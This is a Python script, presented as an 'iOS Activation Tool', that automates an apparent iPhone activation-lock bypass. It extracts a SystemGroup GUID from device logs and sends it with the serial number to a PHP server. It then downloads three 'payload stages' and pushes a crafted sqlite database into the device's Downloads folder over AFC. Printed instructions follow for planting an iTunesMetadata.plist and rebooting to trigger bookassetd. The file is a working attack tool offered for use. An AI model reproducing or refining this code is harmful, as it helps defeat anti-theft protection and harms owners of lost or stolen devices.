import sys
import os
import time
import subprocess
import re
import shutil
import sqlite3
import atexit
import urllib.parse
import json

class Style:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'

class BypassAutomation:
    def __init__(self):
        #ipconfig getifaddr en1 and start php and start: php -S 192.168.0.106:8000 -t public
        self.api_url = "192.168.0.106:8000/get2.php" 
        self.timeouts = {
            'asset_wait': 300,
            'asset_delete_delay': 15,
            'reboot_wait': 300,
            'syslog_collect': 180
        }
        self.mount_point = os.path.join(os.path.expanduser("~"), f".ifuse_mount_{os.getpid()}")
        self.afc_mode = None
        self.device_info = {}
        self.guid = None
        atexit.register(self._cleanup)

    def log(self, msg, level='info'):
        if level == 'info':
            print(f"{Style.GREEN}[✓]{Style.RESET} {msg}")
        elif level == 'error':
            print(f"{Style.RED}[✗]{Style.RESET} {msg}")
        elif level == 'warn':
            print(f"{Style.YELLOW}[⚠]{Style.RESET} {msg}")
        elif level == 'step':
            print(f"\n{Style.BOLD}{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
            print(f"{Style.BOLD}{Style.BLUE}▶{Style.RESET} {Style.BOLD}{msg}{Style.RESET}")
            print(f"{Style.CYAN}" + "━" * 40 + f"{Style.RESET}")
        elif level == 'detail':
            print(f"{Style.DIM}  ╰─▶{Style.RESET} {msg}")
        elif level == 'success':
            print(f"{Style.GREEN}{Style.BOLD}[✓ SUCCESS]{Style.RESET} {msg}")

    def _run_cmd(self, cmd, timeout=None):
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
            return res.returncode, res.stdout.strip(), res.stderr.strip()
        except subprocess.TimeoutExpired:
            return 124, "", "Timeout"
        except Exception as e:
            return 1, "", str(e)

    def verify_dependencies(self):
        self.log("Verifying System Requirements...", "step")
        if shutil.which("ifuse"):
            self.afc_mode = "ifuse"
        else:
            self.afc_mode = "pymobiledevice3"
        self.log(f"AFC Transfer Mode: {self.afc_mode}", "info")

    def mount_afc(self):
        if self.afc_mode != "ifuse":
            return True
        os.makedirs(self.mount_point, exist_ok=True)
        code, out, _ = self._run_cmd(["mount"])
        if self.mount_point in out:
            return True
        for i in range(5):
            code, _, _ = self._run_cmd(["ifuse", self.mount_point])
            if code == 0:
                return True
            time.sleep(2)
        self.log("Failed to mount via ifuse", "error")
        return False

    def unmount_afc(self):
        if self.afc_mode == "ifuse" and os.path.exists(self.mount_point):
            self._run_cmd(["umount", self.mount_point])
            try:
                os.rmdir(self.mount_point)
            except OSError:
                pass

    def _cleanup(self):
        """Ensure cleanup on exit"""
        self.unmount_afc()

    def detect_device(self):
        self.log("Detecting Device...", "step")
        code, out, err = self._run_cmd(["ideviceinfo"])
        if code != 0:
            self.log(f"Device not found. Error: {err or 'Unknown'}", "error")
            sys.exit(1)
        
        info = {}
        for line in out.splitlines():
            if ": " in line:
                key, val = line.split(": ", 1)
                info[key.strip()] = val.strip()
        self.device_info = info
        
        print(f"\n{Style.BOLD}Device: {info.get('ProductType','Unknown')} (iOS {info.get('ProductVersion','?')}){Style.RESET}")
        print(f"UDID: {info.get('UniqueDeviceID','?')}")
        
        if info.get('ActivationState') == 'Activated':
            print(f"{Style.YELLOW}Warning: Device already activated.{Style.RESET}")

    def get_guid_manual(self):
        """Ручной ввод GUID с валидацией"""
        print(f"\n{Style.YELLOW}⚠ GUID Input Required{Style.RESET}")
        print(f"   Format: XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX")
        print(f"   Example: 2A22A82B-C342-444D-972F-5270FB5080DF")
        
        UUID_PATTERN = re.compile(r'^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}$', re.IGNORECASE)
        
        while True:
            guid_input = input(f"\n{Style.BLUE}➤ Enter SystemGroup GUID:{Style.RESET} ").strip()
            if UUID_PATTERN.match(guid_input):
                return guid_input.upper()
            print(f"{Style.RED}❌ Invalid format. Must be 8-4-4-4-12 hex characters (e.g. 2A22A82B-C342-444D-972F-5270FB5080DF).{Style.RESET}")

    def get_guid_auto(self):
        """Precise GUID search via raw tracev3 scanning with detailed logging"""
        self.log("🔍 Scanning logdata.LiveData.tracev3 for 'BLDatabaseManager'...", "step")

        udid = self.device_info['UniqueDeviceID']
        log_path = f"{udid}.logarchive"
        if os.path.exists(log_path):
            shutil.rmtree(log_path)

        # === 1: Log collection ===
        self.log("  ╰─▶ Collecting device logs (up to 120s)...", "detail")
        code, _, err = self._run_cmd(["pymobiledevice3", "syslog", "collect", log_path], timeout=120)
        if code != 0 or not os.path.exists(log_path):
            self.log(f"❌ Log collection failed: {err}", "error")
            return None
        self.log("  ╰─▶ Logs collected successfully", "detail")


        trace_file = os.path.join(log_path, "logdata.LiveData.tracev3")
        if not os.path.exists(trace_file):
            self.log("❌ logdata.LiveData.tracev3 not found in archive", "error")
            shutil.rmtree(log_path)
            return None
        size_mb = os.path.getsize(trace_file) / (1024 * 1024)
        self.log(f"  ╰─▶ Found logdata.LiveData.tracev3 ({size_mb:.1f} MB)", "detail")

        candidates = []
        found_bl = False

        try:
            with open(trace_file, 'rb') as f:
                data = f.read()

            needle = b'BLDatabaseManager'
            pos = 0
            hit_count = 0


            self.log("  ╰─▶ Scanning for 'BLDatabaseManager' in binary...", "detail")
            while True:
                pos = data.find(needle, pos)
                if pos == -1:
                    break
                found_bl = True
                hit_count += 1
                if hit_count <= 5:  
                    snippet = data[pos:pos+100]
                    try:
                        text = snippet[:60].decode('utf-8', errors='replace')
                        self.log(f"      → Hit #{hit_count}: ...{text}...", "detail")
                    except:
                        self.log(f"      → Hit #{hit_count} (binary snippet)", "detail")
                pos += 1

            if not found_bl:
                self.log("❌ 'BLDatabaseManager' NOT FOUND in tracev3", "error")
                return None

            self.log(f"✅ Found {hit_count} occurrence(s) of 'BLDatabaseManager'", "success")


            self.log("  ╰─▶ Searching ±1KB around each 'BLDatabaseManager' for GUIDs...", "detail")
            import re
            guid_pat = re.compile(rb'[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}', re.IGNORECASE)

            pos = 0
            while True:
                pos = data.find(needle, pos)
                if pos == -1:
                    break


                start = max(0, pos - 1024)
                end = min(len(data), pos + len(needle) + 1024)
                window = data[start:end]

                matches = guid_pat.findall(window)
                for raw_guid in matches:
                    guid = raw_guid.decode('ascii').upper()
                    # "Not trash" filter
                    clean = guid.replace('0', '').replace('-', '')
                    if len(clean) >= 8: 
                        candidates.append(guid)
                        offset = start + window.find(raw_guid) - pos
                        direction = "←" if offset < 0 else "→"
                        self.log(
                            f"      → GUID {guid} found {abs(offset)} bytes {direction} from 'BLDatabaseManager'",
                            "detail"
                        )

                pos += 1


            if not candidates:
                self.log("❌ No valid GUIDs found near 'BLDatabaseManager'", "error")
                return None

            from collections import Counter
            counts = Counter(candidates)
            total = len(candidates)
            unique = len(counts)

            self.log(f"  ╰─▶ Found {total} GUID candidate(s), {unique} unique", "info")
            for guid, freq in counts.most_common(5):
                self.log(f"      → {guid} (x{freq})", "detail")

            best_guid, freq = counts.most_common(1)[0]
            if freq >= 2 or total == 1:
                self.log(f"✅ CONFIDENT MATCH: {best_guid}", "success")
                return best_guid
            else:
                self.log(f"⚠️  Low-confidence GUID (x{freq}): {best_guid}", "warn")

                return best_guid

        finally:
            if os.path.exists(log_path):
                shutil.rmtree(log_path)


    def get_all_urls_from_server(self, prd, guid, sn):
        """Requests all three URLs (stage1, stage2, stage3) from the server"""
        params = f"prd={prd}&guid={guid}&sn={sn}"
        url = f"{self.api_url}?{params}"

        self.log(f"Requesting all URLs from server: {url}", "detail")
        

        code, out, err = self._run_cmd(["curl", "-s", url])
        if code != 0:
            self.log(f"Server request failed: {err}", "error")
            return None, None, None

        try:
            data = json.loads(out)
            if data.get('success'):
                stage1_url = data['links']['step1_fixedfile']
                stage2_url = data['links']['step2_bldatabase']
                stage3_url = data['links']['step3_final']
                return stage1_url, stage2_url, stage3_url
            else:
                self.log("Server returned error response", "error")
                return None, None, None
        except json.JSONDecodeError:
            self.log("Server did not return valid JSON", "error")
            return None, None, None

    def run(self):
        os.system('clear')
        print(f"{Style.BOLD}{Style.MAGENTA}iOS Activation Tool - Professional Edition{Style.RESET}\n")
        
        self.verify_dependencies()
        self.detect_device()
        
        print(f"\n{Style.CYAN}GUID Detection Options:{Style.RESET}")
        print(f"  1. {Style.GREEN}Auto-detect from device logs{Style.RESET}")
        print(f"  2. {Style.YELLOW}Manual input{Style.RESET}")
        
        choice = input(f"\n{Style.BLUE}➤ Choose option (1/2):{Style.RESET} ").strip()
        
        if choice == "1":
            self.guid = self.get_guid_auto()
            if self.guid:
                self.log(f"Auto-detected GUID: {self.guid}", "success")
            else:
                self.log("Could not auto-detect GUID, falling back to manual input", "warn")
                self.guid = self.get_guid_manual()
        else:
            self.guid = self.get_guid_manual()
        
        self.log(f"Using GUID: {self.guid}", "info")
        
        input(f"\n{Style.YELLOW}Press Enter to deploy payload with this GUID...{Style.RESET}")

       
        # 2. API Call & Get All URLs
        self.log("Requesting All Payload Stages from Server...", "step")
        prd = self.device_info['ProductType']
        sn = self.device_info['SerialNumber']
        
        stage1_url, stage2_url, stage3_url = self.get_all_urls_from_server(prd, self.guid, sn)
        
        if not stage1_url or not stage2_url or not stage3_url:
            self.log("Failed to get URLs from server", "error")
            sys.exit(1)
        
        self.log(f"Stage1 URL: {stage1_url}", "detail")
        self.log(f"Stage2 URL: {stage2_url}", "detail")
        self.log(f"Stage3 URL: {stage3_url}", "detail")

        # 3. Pre-download all stages
        self.log("Pre-loading all payload stages...", "step")
        stages = [
            ("stage1", stage1_url),
            ("stage2", stage2_url), 
            ("stage3", stage3_url)
        ]
        
        for stage_name, stage_url in stages:
            self.log(f"Pre-loading: {stage_name}...", "detail")
            code, http_code, _ = self._run_cmd(["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", stage_url])
            if http_code != "200":
                self.log(f"Warning: Failed to pre-load {stage_name} (HTTP {http_code})", "warn")
            else:
                self.log(f"Successfully pre-loaded {stage_name}", "info")
            time.sleep(1)

        # 4. Download & Validate final payload (stage3)
        self.log("Downloading final payload...", "step")
        local_db = "downloads.28.sqlitedb"
        if os.path.exists(local_db):
            os.remove(local_db)
        
        self.log(f"Downloading from: {stage3_url}...", "info")
        code, _, err = self._run_cmd(["curl", "-L", "-o", local_db, stage3_url])
        if code != 0:
            self.log(f"Download failed: {err}", "error")
            sys.exit(1)

        # Validate database
        self.log("Validating payload database...", "detail")
        conn = sqlite3.connect(local_db)
        try:
            res = conn.execute("SELECT count(*) FROM sqlite_master WHERE type='table' AND name='asset'")
            if res.fetchone()[0] == 0:
                raise Exception("Invalid DB - no asset table found")
            
            res = conn.execute("SELECT COUNT(*) FROM asset")
            count = res.fetchone()[0]
            if count == 0:
                raise Exception("Invalid DB - no records in asset table")
                
            self.log(f"Database validation passed - {count} records found", "info")
            
            res = conn.execute("SELECT pid, url, local_path FROM asset")
            for row in res.fetchall():
                self.log(f"Record {row[0]}: {row[1]} -> {row[2]}", "detail")
                
        except Exception as e:
            self.log(f"Invalid payload received: {e}", "error")
            sys.exit(1)
        finally:
            conn.close()
        
        # 5. Upload
        self.log("Uploading Payload via AFC...", "step")
        target = "/Downloads/downloads.28.sqlitedb"
        
        if self.afc_mode == "ifuse":
            if not self.mount_afc():
                self.log("Mounting failed — falling back to pymobiledevice3", "warn")
                self.afc_mode = "pymobiledevice3"
        
        if self.afc_mode == "ifuse":
            fpath = self.mount_point + target
            if os.path.exists(fpath):
                os.remove(fpath)
            shutil.copy(local_db, fpath)
            self.log("Uploaded via ifuse", "info")
        else:
            self._run_cmd(["pymobiledevice3", "afc", "rm", target])
            code, _, err = self._run_cmd(["pymobiledevice3", "afc", "push", local_db, target])
            if code != 0:
                self.log(f"AFC upload failed: {err}", "error")
                sys.exit(1)
            self.log("Uploaded via pymobiledevice3", "info")
            
        self.log("✅ Payload Deployed Successfully", "success")
        

        print(f"\n{Style.GREEN}✅ Ready for manual activation.{Style.RESET}")
        print(f"→ Payload is in place at /Downloads/downloads.28.sqlitedb")
        print(f"→ Next steps (manual):")
        print(f"  1. Reboot device (e.g. via Settings or hardware buttons)")
        print(f"  2. After reboot, check if /iTunes_Control/iTunes/iTunesMetadata.plist appeared")
        print(f"  3. Copy it to /Books/iTunesMetadata.plist")
        print(f"     Example: {Style.CYAN}pymobiledevice3 afc pull /iTunes_Control/iTunes/iTunesMetadata.plist . && pymobiledevice3 afc push iTunesMetadata.plist /Books/iTunesMetadata.plist{Style.RESET}")
        print(f"  4. Reboot again to trigger bookassetd stage")
        print(f"→ Monitor logs: {Style.CYAN}idevicesyslog | grep -E 'itunesstored|bookassetd'{Style.RESET}")
        print(f"→ Used GUID: {Style.BOLD}{self.guid}{Style.RESET}")
        
if __name__ == "__main__":
    try:
        BypassAutomation().run()
    except KeyboardInterrupt:
        print(f"\n{Style.YELLOW}Interrupted by user.{Style.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{Style.RED}Fatal error: {e}{Style.RESET}")
        sys.exit(1)
